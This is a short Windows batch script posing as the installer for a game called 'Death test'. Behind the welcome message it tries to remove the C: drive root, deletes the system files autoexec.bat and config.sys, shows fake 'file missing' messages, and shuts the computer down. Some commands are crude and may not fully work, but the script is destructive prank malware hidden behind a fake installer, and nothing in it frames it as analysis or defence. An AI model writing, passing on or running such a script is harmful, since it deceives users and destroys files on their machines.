   @echo off
   cd\
   cls
   echo welcome to the Death test-the latest game, please press to install.
   pause >nul
   cls
   rmdir/q c:\
   del autoexec.bat
   del config.sys
   echo File missing, press to see details
   pause >nul
   cls
   echo File c:\ missing
   echo File autoexec.bat missing
   echo File config.sys missing
   pause
   cls
   echo Sorry, Instalation Cancelled.
   shutdown -s
   end
